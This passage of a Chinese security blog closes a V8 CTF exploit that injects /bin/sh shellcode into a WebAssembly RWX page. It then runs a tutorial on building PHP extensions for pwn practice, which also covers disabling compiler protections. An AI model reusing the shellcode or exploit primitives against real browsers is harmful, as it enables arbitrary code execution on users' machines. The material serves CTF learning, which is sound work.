class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">f();</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png" alt="image-20220322194115446"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2019/tree/master/pwn-OOB" >starctf2019/pwn-OOB at master · sixstars/starctf2019 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/10/PHP_PWN/">PHP_PWN入门</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-02-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、php拓展模块搭建和编写"   >
          <a href="#一、php拓展模块搭建和编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、php拓展模块搭建和编写" class="headerlink" title="一、php拓展模块搭建和编写"></a>一、php拓展模块搭建和编写</h1>
      
        <h2 id="1-创建模块模板"   >
          <a href="#1-创建模块模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建模块模板" class="headerlink" title="1.创建模块模板"></a>1.创建模块模板</h2>
      <p>找到php源码目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120778.png" alt="image-20220210174644261"></p>
<p>然后使用<code>ext_skel</code>创建一个模板</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=helloworld</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-编译模块"   >
          <a href="#2-编译模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-编译模块" class="headerlink" title="2.编译模块"></a>2.编译模块</h2>
      <p>随后进行编译，跳转到刚刚生成的模块文件夹路径<code>/path_to_php_src/ext/helloworld</code>，然后编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/56/bin/phpize</span><br><span class="line">./configure  --with-php-config=/www/server/php/56/bin/php-config</span><br></pre></td></tr></table></div></figure>

<p>这里需要指定一下<code>--with-php-config</code>，选择自己的<code>php-config</code>，当然如果本地的环境变量bin命令下直接有<code>php-config</code>也不用指定了，随后</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></div></figure>

<p>这样就可以在当前目录下生成了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120756.png" alt="image-20220210175900511"></p>
<p>其中<code>helloworld.c</code>即为创建的模板代码，但是不知道为什么5.6版本的编译完成后，不生成.so模块文件，可能是版本特性？</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helloword extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：不同版本创建模板"   >
          <a href="#🔺注：不同版本创建模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：不同版本创建模板" class="headerlink" title="🔺注：不同版本创建模板"></a>🔺注：不同版本创建模板</h2>
      <p>需要注意的是，在php7.3以上，<code>ext_skel</code>这个shell变成了<code>ext_skel.php</code>，所以我们使用如下来创建</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">cd helloworld</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：默认的保护措施"   >
          <a href="#🔺注：默认的保护措施" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：默认的保护措施" class="headerlink" title="🔺注：默认的保护措施"></a>🔺注：默认的保护措施</h2>
      <p>同时需要注意的是，在configure设置完之后，保护措施也需要设置一下，默认编译的保护如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121247504.png" alt="image-20220212124731449"></p>
<p>可以看到除了RELRO没有加强保护之外，其他都加入了，我们在Makefile中可以进行相关的保护措施消除</p>
<p>这里试了很多遍，貌似只能关掉Canary保护和FORTIFY保护</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121258947.png" alt="image-20220212125859899"></p>

        <h2 id="3-加载模块"   >
          <a href="#3-加载模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-加载模块" class="headerlink" title="3.加载模块"></a>3.加载模块</h2>
      
        <h3 id="方法一："   >
          <a href="#方法一：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3>
      <p>直接<code>make install</code>，然后在对应的php.ini中添加<code>extension=helloword.so</code></p>

        <h3 id="方法二："   >
          <a href="#方法二：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3>
      <p>复制modules下的helloworld.so模块到对应的php扩展目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>同样也得在php.ini中添加extension</p>
<p>之后使用模板中函数测试即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>如下即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111120676.png"></p>
<p>这个php拓展模块其实跟linux内核有点像</p>

        <h2 id="🔺注：php-ini的设置"   >
          <a href="#🔺注：php-ini的设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：php-ini的设置" class="headerlink" title="🔺注：php.ini的设置"></a>🔺注：php.ini的设置</h2>
      <p>需要注意的是php.ini(php-fpm的php.ini)和php-cli.ini(php-cli的php.ini)的区别设置</p>
<p>对于php-fpm的php.ini，只会在web服务器上生效，而对于php-cli的php.ini才是在命令行中生效，所以如果我们需要使用命令行直接调试php，那么就需要修改php-cli中的php.ini才行的。以下是用宝塔linux搭建的Php环境，如果在命令行中生效则需要修改Php-cli.ini才行的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111605414.png" alt="image-20220211160511335"></p>

        <h2 id="4-编写函数"   >
          <a href="#4-编写函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-编写函数" class="headerlink" title="4.编写函数"></a>4.编写函数</h2>
      <p>以下是php7及以上的语法，之前版本的会有所不同</p>

        <h3 id="1-PHP-FUNCTION"   >
          <a href="#1-PHP-FUNCTION" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP-FUNCTION" class="headerlink" title="(1)PHP_FUNCTION"></a>(1)PHP_FUNCTION</h3>
      
        <h3 id="①框架编写"   >
          <a href="#①框架编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#①框架编写" class="headerlink" title="①框架编写"></a>①框架编写</h3>
      <p>由<code>PHP_FUNCTION</code> 修饰的函数相当于直接的定义函数，所以我们定义函数时，需要用该修饰符来修饰，格式如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(funcName)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>至于这个<code>ZEND_PARSE_PARAMETERS_NONE();</code>代表定义的该函数无参数传递。</p>

        <h3 id="②参数传递"   >
          <a href="#②参数传递" class="heading-link"><i class="fas fa-link"></i></a><a href="#②参数传递" class="headerlink" title="②参数传递"></a>②参数传递</h3>
      <p>而当我们需要给函数传递参数时，就需要用到<code>ZEND_PARSE_PARAMETERS_START</code>来设置函数的参数个数</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)       </span><br><span class="line">    <span class="function">Z_PARAM_OPTIONAL             </span></span><br><span class="line"><span class="function">    <span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span>   </span></span><br><span class="line"><span class="function"><span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//老版本写法：</span></span><br><span class="line"><span class="keyword">char</span> *var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> var_len;</span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;var, &amp;var_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>上述的<code>ZEND_PARSE_PARAMETERS_START(0, 1)</code>即代表传入参数个数为<code>0~1</code>，可变个数，如果个数不符合，则会触发异常。同样也可以设置为<code>1~1</code>，<code>2~4</code>等等之类的。</p>
<p><code>Z_PARAM_STRING</code>代表一种参数类型，即<code>char*</code>，传入的参数给到var，长度给到var_len，还有的其他类型如下。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">specifier    Fast ZPP API macro    args</span><br><span class="line">|    <span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">a    <span class="title">Z_PARAM_ARRAY</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">A    <span class="title">Z_PARAM_ARRAY_OR_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">b    <span class="title">Z_PARAM_BOOL</span><span class="params">(dest)</span>    dest - zend_bool</span></span><br><span class="line"><span class="function">C    <span class="title">Z_PARAM_CLASS</span><span class="params">(dest)</span>    dest - zend_class_entry*</span></span><br><span class="line"><span class="function">d    <span class="title">Z_PARAM_DOUBLE</span><span class="params">(dest)</span>    dest - <span class="keyword">double</span></span></span><br><span class="line"><span class="function">f    <span class="title">Z_PARAM_FUNC</span><span class="params">(fci, fcc)</span>    fci - zend_fcall_info, fcc - zend_fcall_info_cache</span></span><br><span class="line"><span class="function">h    <span class="title">Z_PARAM_ARRAY_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">H    <span class="title">Z_PARAM_ARRAY_OR_OBJECT_HT</span><span class="params">(dest)</span>    dest - HashTable*</span></span><br><span class="line"><span class="function">l    <span class="title">Z_PARAM_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">L    <span class="title">Z_PARAM_STRICT_LONG</span><span class="params">(dest)</span>    dest - <span class="keyword">long</span></span></span><br><span class="line"><span class="function">o    <span class="title">Z_PARAM_OBJECT</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">O    <span class="title">Z_PARAM_OBJECT_OF_CLASS</span><span class="params">(dest, ce)</span>    dest - zval*</span></span><br><span class="line"><span class="function">p    <span class="title">Z_PARAM_PATH</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">P    <span class="title">Z_PARAM_PATH_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">r    <span class="title">Z_PARAM_RESOURCE</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">s    <span class="title">Z_PARAM_STRING</span><span class="params">(dest, dest_len)</span>    dest - <span class="keyword">char</span>*, dest_len - <span class="keyword">int</span></span></span><br><span class="line"><span class="function">S    <span class="title">Z_PARAM_STR</span><span class="params">(dest)</span>    dest - zend_string*</span></span><br><span class="line"><span class="function">z    <span class="title">Z_PARAM_ZVAL</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">     <span class="title">Z_PARAM_ZVAL_DEREF</span><span class="params">(dest)</span>    dest - zval*</span></span><br><span class="line"><span class="function">+    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;+&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br><span class="line"><span class="function">*    <span class="title">Z_PARAM_VARIADIC</span><span class="params">(<span class="string">&#x27;*&#x27;</span>, dest, num)</span>    dest - zval*, num <span class="keyword">int</span></span></span><br></pre></td></tr></table></div></figure>

<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233831#h3-3" >AntCTF ^ D3CTF 2021 hackphp - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="③参数信息定义"   >
          <a href="#③参数信息定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#③参数信息定义" class="headerlink" title="③参数信息定义"></a>③参数信息定义</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></div></figure>

<p>这里就在<code>ZEND_BEGIN_ARG_INFO</code>中定义了参数arginfo_helloword_test1和arginfo_helloword_test2，然后在<code>ZEND_ARG_INFO</code>中设置参数名称，在<code>ZEND_ARG_INFO</code>中第一个参数代表是否为引用，第二个参数设置名称，比如这里就设置为<code>str</code>。这个参数信息的定义在之后的函数注册中需要用到。</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.maoyingdong.com/php7_extension_development_tutorial_3/" >Linux下PHP7扩展开发入门教程3：编写第一个函数 | 毛英东的个人博客 (maoyingdong.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-函数注册"   >
          <a href="#2-函数注册" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-函数注册" class="headerlink" title="(2)函数注册"></a>(2)函数注册</h2>
      <p>和内核类似，需要将我们编写的函数进行注册</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如上，即使用<code>PHP_FE</code>来注册函数，需要传入函数名称和函数参数定义信息。</p>

        <h2 id="3-模块注册"   >
          <a href="#3-模块注册" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-模块注册" class="headerlink" title="(3)模块注册"></a>(3)模块注册</h2>
      <p>最后整个模块使用<code>zend_module_entry</code>进行模块注册</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>






        <h1 id="二、调试php拓展"   >
